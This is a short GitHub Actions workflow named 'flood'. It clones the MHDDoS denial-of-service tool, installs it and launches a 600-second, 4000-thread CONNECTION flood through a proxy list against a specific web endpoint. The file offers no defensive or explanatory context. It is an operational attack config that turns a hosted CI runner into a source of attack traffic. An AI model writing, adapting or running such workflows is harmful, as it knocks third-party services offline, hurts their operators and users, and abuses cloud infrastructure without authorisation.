name: flood
on: workflow_dispatch
jobs:
  flood:
    runs-on: ubuntu-24.04-arm
    steps:
      - name: Flood
        run: |
          git clone https://github.com/MatrixTM/MHDDoS.git
          cd MHDDoS
          pip install -r requirements.txt
          python start.py CONNECTION https://lscf.eu.cc/api/update 0 4000 all.txt 4000 600 true
